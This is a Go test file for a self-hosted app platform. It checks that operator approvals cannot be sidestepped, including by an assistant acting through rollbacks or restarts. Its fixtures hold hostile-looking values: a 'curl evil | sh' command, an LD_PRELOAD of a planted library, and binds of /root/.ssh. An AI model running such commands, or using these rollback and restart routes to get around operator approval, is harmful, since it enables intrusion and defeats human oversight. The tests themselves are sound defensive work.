package apps

import (
	"context"
	"errors"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"gitea.lan/matthew/fog/internal/build"
	"gitea.lan/matthew/fog/internal/dockerx"
	"gitea.lan/matthew/fog/internal/store"
	"gitea.lan/matthew/fog/internal/vault"
)

// The attack: an assistant rolls back to a revision with another image, a
// command, a published port, a Drive mount or a follows, a sidecar or an
// env preload — all of which the old comparison (host, raw, reach) let
// through. Any difference in what runs, binds, publishes or reaches makes
// the revision the operator's; notes, backups and health don't.
func TestAssistantRollbackComparesEverythingThatMatters(t *testing.T) {
	base := func() *AppSpec {
		return &AppSpec{Source: Source{Type: "image", Image: "app:1"}, DeployStrategy: "restart",
			Volumes: []Volume{{Name: "data", Mount: "/data", Files: "Apps/App"}}}
	}
	differs := map[string]func(*AppSpec){
		"image":    func(s *AppSpec) { s.Source.Image = "evil:1" },
		"repo":     func(s *AppSpec) { s.Source = Source{Type: "git", Repo: "ssh://git@evil/x.git"} },
		"command":  func(s *AppSpec) { s.Command = []string{"sh", "-c", "curl evil | sh"} },
		"port":     func(s *AppSpec) { s.Ports = []Port{{Port: 22, HostPort: 2222}} },
		"drive":    func(s *AppSpec) { s.Volumes[0].Files = "Apps/Vault" },
		"follows":  func(s *AppSpec) { s.Volumes[0].Follows = "vault/data" },
		"uses":     func(s *AppSpec) { s.Uses = []string{"vault"} },
		"sidecar":  func(s *AppSpec) { s.Aux = []AuxService{{Name: "x", Image: "evil:1"}} },
		"env":      func(s *AppSpec) { s.Env = map[string]string{"LD_PRELOAD": "/data/evil.so"} },
		"raw":      func(s *AppSpec) { s.AcknowledgeRawSockets = true },
		"auth":     func(s *AppSpec) { s.Routes = []Route{{Port: 80}} },
		"release":  func(s *AppSpec) { s.Release = []string{"sh"} },
		"sealed":   func(s *AppSpec) { s.Network = "sealed" },
		"hostpath": func(s *AppSpec) { s.Volumes = append(s.Volumes, Volume{Name: "k", Mount: "/k", Host: "/root"}) },
		"memory":   func(s *AppSpec) { s.MemoryLimit = "64g" },
	}
	for name, change := range differs {
		s := base()
		change(s)
		if SameAccessAs(s, base()) {
			t.Errorf("%s: a revision differing in it passes as the same", name)
		}
	}
	s := base()
	s.Notes, s.Health = "old notes", &Health{Path: "/up"}
	if !SameAccessAs(s, base()) {
		t.Error("a revision differing only in notes and health is refused")
	}
}

// The attack: an operator withdraws an app's bind of /srv/vault; an
// assistant restarts the app, and the old compose file brought the bind
// back. Every start and restart is judged against the approvals as they
// stand: refused, the app stopped, and the refusal filed.
func TestStartChecksTheApprovalsAsTheyStand(t *testing.T) {
	e := reviewEngine(t)
	e.Log = slog.New(slog.NewTextHandler(io.Discard, nil))
	ctx := context.Background()
	spec := &AppSpec{Source: Source{Type: "image", Image: "app:1"},
		Volumes:               []Volume{{Name: "v", Mount: "/v", Host: "/srv/vault"}},
		AcknowledgeHostAccess: []string{"/srv/vault"}}
	if err := e.Create(ctx, "app", spec, nil, "admin"); err != nil {
		t.Fatal(err)
	}
	if err := e.ApproveSpec("app", spec, "admin"); err != nil {
		t.Fatal(err)
	}
	app, _ := e.Store.AppByName("app")
	e.Store.SetAppCurrentRev(app.ID, 1)
	// Withdrawn, by the operator's save of a spec without it.
	if err := e.ApproveSpec("app", &AppSpec{Source: spec.Source}, "admin"); err != nil {
		t.Fatal(err)
	}
	for _, verb := range []func(context.Context, string, string) error{e.Start, e.Restart} {
		err := verb(ctx, "app", "mcp:assistant")
		if err == nil || !strings.Contains(err.Error(), "no operator has approved: host folder /srv/vault") {
			t.Fatalf("start with the approval withdrawn = %v", err)
		}
	}
	if why := e.RulesRefused()["app"]; !strings.Contains(why, "/srv/vault") {
		t.Fatalf("refusal not recorded: %q", why)
	}
}

// The attack: an app binds another app's Drive folder — Apps/Vault, where
// its credentials live — or all of Apps, or Peers, and nothing asked: every
// Drive folder counted as fog's storage. Now only the app's own folder, the
// libraries and a folder an app it uses shares with it bind freely; the
// rest needs the operator's approval, by files: or by host: path alike.
func TestOtherAppsDriveFoldersNeedApproval(t *testing.T) {
	e := reviewEngine(t)
	drive := filepath.Join(t.TempDir(), "drive")
	e.Mat.FilesRoot = func() string { return drive }
	ctx := context.Background()
	vault := &AppSpec{Source: Source{Type: "image", Image: "vault:1"},
		Volumes:    []Volume{{Name: "data", Mount: "/data", Files: "Apps/Vault"}, {Name: "exports", Mount: "/x", Files: "Apps/Vault/exports"}},
		Connection: &Connection{Port: 80, Shares: []string{"exports"}}}
	if err := e.Create(ctx, "vault", vault, nil, "admin"); err != nil {
		t.Fatal(err)
	}
	vol := func(files, host string) *AppSpec {
		return &AppSpec{Source: Source{Type: "image", Image: "evil:1"},
			Volumes: []Volume{{Name: "v", Mount: "/v", Files: files, Host: host}}}
	}
	for name, s := range map[string]*AppSpec{
		"other app":         vol("Apps/Vault", ""),
		"inside other app":  vol("apps/vault/secrets", ""),
		"every app":         vol("Apps", ""),
		"peers":             vol("Peers/kim", ""),
		"by host path":      vol("", filepath.Join(drive, "Apps/Vault")),
		"shared but unused": vol("Apps/Vault/exports", ""),
	} {
		if err := e.validateHostAccess("evil", s); err == nil || !strings.Contains(err.Error(), "acknowledgeHostAccess") {
			t.Errorf("%s: saved without an acknowledgement (%v)", name, err)
		}
	}
	for name, s := range map[string]*AppSpec{
		"its own":   vol("Apps/Evil/config", ""),
		"a library": vol("Content/Movies", ""),
		"shared":    func() *AppSpec { s := vol("Apps/Vault/exports/2026", ""); s.Uses = []string{"vault"}; return s }(),
	} {
		if err := e.validateHostAccess("evil", s); err != nil {
			t.Errorf("%s: %v", name, err)
		}
	}

	// Acknowledged by the manifest: saved, held, shown as dangerous — and
	// it binds only once the operator approves it.
	s := vol("Apps/Vault", "")
	s.AcknowledgeHostAccess = []string{"Apps/Vault"}
	if err := e.CreateForReview(ctx, "evil", s, nil, "import"); err != nil {
		t.Fatal(err)
	}
	r, rev, _ := e.AppReview("evil")
	if len(r.Mounts) != 1 || r.Mounts[0].Dangerous == "" || !r.Mounts[0].Acknowledged || r.Mounts[0].OtherApp != "Vault" {
		t.Fatalf("review mounts = %+v", r.Mounts)
	}
	app, _ := e.Store.AppByName("evil")
	if err := e.checkApprovals(app, s); err == nil || !strings.Contains(err.Error(), "Drive folder Apps/Vault") {
		t.Fatalf("unapproved: %v", err)
	}
	if err := e.ConfirmReview("evil", rev, false, "admin"); err != nil {
		t.Fatal(err)
	}
	if err := e.checkApprovals(app, s); err != nil {
		t.Fatalf("approved by reading the review, still refused: %v", err)
	}
}

// The attack: an app was deleted with its data kept, and an import takes
// its name — and with it the old app's data, Drive folder and database,
// accounts and credentials included, unannounced. The review lists what it
// would take over, and confirming needs the operator's say-so.
func TestImportTakingOverLeftoverDataNeedsConsent(t *testing.T) {
	e := reviewEngine(t)
	drive := filepath.Join(t.TempDir(), "drive")
	e.Mat.FilesRoot = func() string { return drive }
	ctx := context.Background()
	for _, d := range []string{filepath.Join(e.Mat.DataPath("vault"), "db"), filepath.Join(drive, "Apps/Vault")} {
		os.MkdirAll(d, 0o755)
		os.WriteFile(filepath.Join(d, "secrets"), []byte("x"), 0o600)
	}
	if err := e.CreateForReview(ctx, "vault", &AppSpec{Source: Source{Type: "image", Image: "evil:1"}}, nil, "import"); err != nil {
		t.Fatal(err)
	}
	r, rev, err := e.AppReview("vault")
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Leftovers) != 2 || !strings.Contains(strings.Join(r.Leftovers, "\n"), "Apps/Vault") {
		t.Fatalf("leftovers = %v", r.Leftovers)
	}
	var left *ErrLeftovers
	if err := e.ConfirmReview("vault", rev, false, "admin"); !errors.As(err, &left) {
		t.Fatalf("confirmed without consent to adopt: %v", err)
	}
	if held, _ := e.ReviewPending("vault"); !held {
		t.Fatal("the refused confirmation released the hold")
	}
	if err := e.ConfirmReview("vault", rev, true, "admin"); err != nil {
		t.Fatal(err)
	}

	// A fresh name has nothing to take over.
	if err := e.CreateForReview(ctx, "fresh", &AppSpec{Source: Source{Type: "image", Image: "x:1"}}, nil, "import"); err != nil {
		t.Fatal(err)
	}
	if r, _, _ := e.AppReview("fresh"); len(r.Leftovers) != 0 {
		t.Errorf("leftovers for a fresh name: %v", r.Leftovers)
	}
}

// The boot pass retries an app whose start failed; an operator who stopped
// it in the meantime has the last word, and it isn't started again.
func TestBootPassNeverUndoesAnOperatorsStop(t *testing.T) {
	e := reviewEngine(t)
	e.Log = slog.New(slog.NewTextHandler(io.Discard, nil))
	old := reapplyRetry
	reapplyRetry = 300 * time.Millisecond
	t.Cleanup(func() { reapplyRetry = old })
	ctx := context.Background()
	// A git app with no deployed version on record: its start fails, as a
	// step that may pass, so the pass would try it again.
	app, _ := e.Store.CreateApp("app")
	e.Store.CreateRevision(app.ID, `{"source":{"type":"git","repo":"ssh://git@host/x.git"}}`, "", "t")
	e.Store.SetAppCurrentRev(app.ID, 1)
	e.Store.SetAppDesiredState(app.ID, "running")
	done := make(chan struct{})
	go func() { e.ReapplyRules(ctx); close(done) }()
	deadline := time.Now().Add(5 * time.Second)
	for e.RulesRefused()["app"] == "" {
		if time.Now().After(deadline) {
			t.Fatal("the first attempt never happened")
		}
		time.Sleep(10 * time.Millisecond)
	}
	// The operator stops it between attempts.
	e.Store.SetAppDesiredState(app.ID, "stopped")
	e.rulesRefused.Delete("app")
	<-done
	if why := e.RulesRefused()["app"]; why != "" {
		t.Fatalf("the pass tried the stopped app again: %s", why)
	}
	if a, _ := e.Store.AppByName("app"); a.DesiredState != "stopped" {
		t.Fatalf("desired state %s", a.DesiredState)
	}
}

// The attack: the operator withdraws an app's use of another, which took
// away the folder that one shares with it — and a restart of the running
// revision, which still said uses, bound it again. Which shares an app
// sees is read from its latest revision, as its network reach is.
func TestWithdrawnUsesTakesTheSharedFolderAtRestart(t *testing.T) {
	e := reviewEngine(t)
	e.Log = slog.New(slog.NewTextHandler(io.Discard, nil))
	drive := filepath.Join(t.TempDir(), "drive")
	e.Mat.FilesRoot = func() string { return drive }
	ctx := context.Background()
	if err := e.Create(ctx, "vault", &AppSpec{Source: Source{Type: "image", Image: "vault:1"},
		Volumes:    []Volume{{Name: "exports", Mount: "/x", Files: "Apps/Vault/exports"}},
		Connection: &Connection{Port: 80, Shares: []string{"exports"}}}, nil, "admin"); err != nil {
		t.Fatal(err)
	}
	running := &AppSpec{Source: Source{Type: "image", Image: "hook:1"}, Uses: []string{"vault"},
		Volumes: []Volume{{Name: "x", Mount: "/x", Files: "Apps/Vault/exports"}}}
	if err := e.Create(ctx, "hook", running, nil, "admin"); err != nil {
		t.Fatal(err)
	}
	hook, _ := e.Store.AppByName("hook")
	e.Store.SetAppCurrentRev(hook.ID, 1)
	if err := e.UpdateSpec(ctx, "hook", &AppSpec{Source: running.Source}, nil, "stop using vault", "admin"); err != nil {
		t.Fatal(err)
	}
	if err := e.Restart(ctx, "hook", "mcp:assistant"); err == nil || !strings.Contains(err.Error(), "Apps/Vault/exports") {
		t.Fatalf("restart of the running revision after uses was withdrawn = %v", err)
	}
	if err := e.checkApprovals(hook, running); err == nil {
		t.Fatal("the shared folder still needs no approval")
	}
}

// A secret the running revision lists is taken away — a disconnect, a
// deleted provider, an edit — and the app's restart then failed, and after
// a reboot it stayed down. A start runs it with the secret empty, and says
// so.
func TestStartToleratesASecretTakenAway(t *testing.T) {
	t.Setenv("DOCKER_SOCK", filepath.Join(t.TempDir(), "none.sock"))
	e := reviewEngine(t)
	e.Log = slog.New(slog.NewTextHandler(io.Discard, nil))
	vlt, err := vault.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	e.Vault, e.Docker = vlt, dockerx.New()
	ctx := context.Background()
	if err := e.Create(ctx, "app", &AppSpec{Source: Source{Type: "image", Image: "app:1"}, Secrets: []string{"LUCID_API_KEY"}},
		map[string]string{"LUCID_API_KEY": "k"}, "admin"); err != nil {
		t.Fatal(err)
	}
	app, _ := e.Store.AppByName("app")
	e.Store.SetAppCurrentRev(app.ID, 1)
	e.Store.DeleteSecret(app.ID, "LUCID_API_KEY")

	err = e.Start(ctx, "app", "system")
	if err != nil && strings.Contains(err.Error(), "LUCID_API_KEY") {
		t.Fatalf("the start failed on the missing secret: %v", err)
	}
	if got := e.SecretsMissing()["app"]; len(got) != 1 || got[0] != "LUCID_API_KEY" {
		t.Fatalf("missing secrets not recorded: %v", got)
	}
	// A deploy still insists: it renders the revision as saved.
	if _, err := e.mergedEnv(app.ID, &AppSpec{Secrets: []string{"LUCID_API_KEY"}}); err == nil {
		t.Fatal("a deploy's environment passed without its secret")
	}
}

// A provider is deleted while a consumer binds a folder in the provider's
// own Apps/<Name>, shared with it. The consumer forgets the provider — the
// save goes through — and keeps the folder in its spec, but the folder is
// no longer approved: it stops at its next start until the operator says
// so, and a notice tells them.
func TestDeletedProvidersSharedFolderNeedsTheOperator(t *testing.T) {
	t.Setenv("DOCKER_SOCK", filepath.Join(t.TempDir(), "none.sock"))
	e := reviewEngine(t)
	e.Log = slog.New(slog.NewTextHandler(io.Discard, nil))
	e.Docker = dockerx.New()
	e.Builder = &build.Builder{DataDir: t.TempDir()}
	drive := filepath.Join(t.TempDir(), "drive")
	e.Mat.FilesRoot = func() string { return drive }
	ctx := context.Background()
	if err := e.Create(ctx, "sab", &AppSpec{Source: Source{Type: "image", Image: "sab:1"},
		Volumes:    []Volume{{Name: "downloads", Mount: "/d", Files: "Apps/Sab/downloads"}},
		Connection: &Connection{Port: 80, Shares: []string{"downloads"}}}, nil, "admin"); err != nil {
		t.Fatal(err)
	}
	if err := e.Create(ctx, "sonarr", &AppSpec{Source: Source{Type: "image", Image: "sonarr:1"}, Uses: []string{"sab"},
		Volumes: []Volume{{Name: "dl", Mount: "/dl", Files: "Apps/Sab/downloads", Follows: "sab/downloads"}}}, nil, "admin"); err != nil {
		t.Fatal(err)
	}
	if err := e.Delete(ctx, "sab", false, "admin"); err != nil {
		t.Fatal(err)
	}
	sonarr, _ := e.Store.AppByName("sonarr")
	got, _ := LatestSpec(e.Store, sonarr.ID)
	if slices.Contains(got.Uses, "sab") || got.Volumes[0].Follows != "" || got.Volumes[0].Files != "Apps/Sab/downloads" {
		t.Fatalf("sonarr after the delete: %+v", got)
	}
	if err := e.checkApprovals(sonarr, got); err == nil || !strings.Contains(err.Error(), "Apps/Sab/downloads") {
		t.Fatalf("the orphaned folder is still approved: %v", err)
	}
	found := false
	if ns, _ := e.Store.ActiveNotices(); true {
		for _, n := range ns {
			found = found || (n.Kind == "shared-folder-orphaned" && n.App == "sonarr")
		}
	}
	if !found {
		t.Error("no notice says sonarr will stop")
	}
}

// A refused app leaves nothing on disk anything could run: its compose file
// is emptied, so a restore, a cancelled restore or a hand-run compose finds
// no service. And an app never deployed isn't started from a file at all.
func TestRefusedAppsComposeFileRunsNothing(t *testing.T) {
	e := reviewEngine(t)
	ctx := context.Background()
	a, _ := e.Store.CreateApp("evil")
	r, _ := e.Store.CreateRevision(a.ID, `{"source":{"type":"image","image":"x:1"},"volumes":[{"name":"k","mount":"/k","host":"/root/.ssh"}],"acknowledgeHostAccess":["/root/.ssh"]}`, "", "import")
	e.Store.SetAppCurrentRev(a.ID, r.Rev)
	dir := e.Mat.AppDir("evil")
	os.MkdirAll(dir, 0o755)
	os.WriteFile(filepath.Join(dir, "compose.yaml"), []byte("services:\n  evil:\n    image: x:1\n    volumes: [\"/root/.ssh:/k\"]\n"), 0o644)
	if err := e.Start(ctx, "evil", "admin"); err == nil {
		t.Fatal("an unapproved bind started")
	}
	b, _ := os.ReadFile(filepath.Join(dir, "compose.yaml"))
	if strings.Contains(string(b), "/root/.ssh") || !strings.Contains(string(b), "services: {}") {
		t.Fatalf("the refused render is still on disk:\n%s", b)
	}
	if err := e.BringUpLocked(ctx, "evil"); err == nil {
		t.Fatal("a restore's bring-up started the refused app")
	}
	e.Store.CreateApp("never")
	os.MkdirAll(e.Mat.AppDir("never"), 0o755)
	if err := e.Start(ctx, "never", "admin"); err == nil || !strings.Contains(err.Error(), "never been deployed") {
		t.Fatalf("a never-deployed app's start = %v", err)
	}
}

// Storage fog doesn't mount — a USB disk, an fstab or automount share — has
// no hook to wake what waits for it: a waiting app is tried again on its
// own, a minute and then longer apart, until its source is there; one the
// operator stops meanwhile is forgotten.
func TestWaitingAppsAreRetriedUntilTheirSourceIsThere(t *testing.T) {
	e := reviewEngine(t)
	disk := filepath.Join(t.TempDir(), "usb")
	started := map[string]int{}
	e.bringUpSeam = func(ctx context.Context, app *store.App, _ bool) error {
		if _, err := os.Stat(disk); err != nil {
			return e.waitForStorage(ctx, app.Name, notReadyError{err})
		}
		started[app.Name]++
		e.waiting.Delete(app.Name)
		return nil
	}
	ctx := context.Background()
	for _, n := range []string{"photos", "parked"} {
		a, _ := e.Store.CreateApp(n)
		r, _ := e.Store.CreateRevision(a.ID, `{"source":{"type":"image","image":"x:1"}}`, "", "t")
		e.Store.SetAppCurrentRev(a.ID, r.Rev)
		if err := e.Start(ctx, n, "admin"); err == nil {
			t.Fatalf("%s started without its disk", n)
		}
	}
	if len(e.Waiting()) != 2 {
		t.Fatalf("waiting = %v", e.Waiting())
	}
	// Not yet its turn: nothing tried.
	e.RetryWaiting(ctx)
	if len(started) != 0 {
		t.Fatalf("tried before its time: %v", started)
	}
	// Tried while still missing: waits again, the next try further off.
	due := func(n string) {
		v, _ := e.waiting.Load(n)
		w := v.(waitState)
		w.next = time.Now().Add(-time.Second)
		e.waiting.Store(n, w)
	}
	due("photos")
	e.RetryWaiting(ctx)
	if v, ok := e.waiting.Load("photos"); !ok || v.(waitState).delay < 2*time.Minute || v.(waitState).delay > 3*time.Minute {
		t.Fatalf("backoff after a second miss: %+v", v)
	}
	// The disk is plugged in; the operator stops the other meanwhile.
	os.MkdirAll(disk, 0o755)
	parked, _ := e.Store.AppByName("parked")
	e.Store.SetAppDesiredState(parked.ID, "stopped")
	due("photos")
	due("parked")
	e.RetryWaiting(ctx)
	if started["photos"] != 1 || started["parked"] != 0 {
		t.Fatalf("started = %v", started)
	}
	if len(e.Waiting()) != 0 {
		t.Fatalf("still waiting: %v", e.Waiting())
	}
}

// A start that keeps failing at boot for a reason that may pass isn't left
// running under its older render: it is stopped, filed, and tried again on
// the retry loop — never on the network loop, and never while the app is
// busy with something else.
func TestBootFailuresAreParkedAndRetried(t *testing.T) {
	e := reviewEngine(t)
	old := reapplyRetry
	reapplyRetry = 10 * time.Millisecond
	t.Cleanup(func() { reapplyRetry = old })
	healthy := false
	tries := 0
	e.bringUpSeam = func(ctx context.Context, app *store.App, _ bool) error {
		tries++
		if !healthy {
			e.rulesRefused.Store(app.Name, "postgres isn't up")
			return errors.New("postgres isn't up")
		}
		e.rulesRefused.Delete(app.Name)
		e.waiting.Delete(app.Name)
		return nil
	}
	ctx := context.Background()
	a, _ := e.Store.CreateApp("db-app")
	r, _ := e.Store.CreateRevision(a.ID, `{"source":{"type":"image","image":"x:1"}}`, "", "t")
	e.Store.SetAppCurrentRev(a.ID, r.Rev)
	e.Store.SetAppDesiredState(a.ID, "running")

	e.ReapplyRules(ctx)
	if tries != 3 {
		t.Fatalf("boot attempts = %d, want 3", tries)
	}
	if e.RulesRefused()["db-app"] == "" {
		t.Fatal("not filed")
	}
	if _, parked := e.waiting.Load("db-app"); !parked {
		t.Fatal("not parked for another try")
	}
	if len(e.Waiting()) != 0 {
		t.Fatalf("filed as waiting for storage: %v", e.Waiting())
	}
	due := func() {
		v, _ := e.waiting.Load("db-app")
		w := v.(waitState)
		w.next = time.Now().Add(-time.Second)
		e.waiting.Store("db-app", w)
	}
	// Busy (a deploy holds its lock): skipped, not waited for.
	due()
	unlock := e.lock("db-app")
	done := make(chan struct{})
	go func() { e.RetryWaiting(ctx); close(done) }()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("the retry waited on a busy app")
	}
	unlock()
	if tries != 3 {
		t.Fatalf("a busy app was tried: %d", tries)
	}
	// Free, and its database is up now.
	healthy = true
	due()
	e.RetryWaiting(ctx)
	if tries != 4 || e.RulesRefused()["db-app"] != "" {
		t.Fatalf("tries %d, refused %q", tries, e.RulesRefused()["db-app"])
	}
	if _, parked := e.waiting.Load("db-app"); parked {
		t.Fatal("still parked after it came up")
	}
}
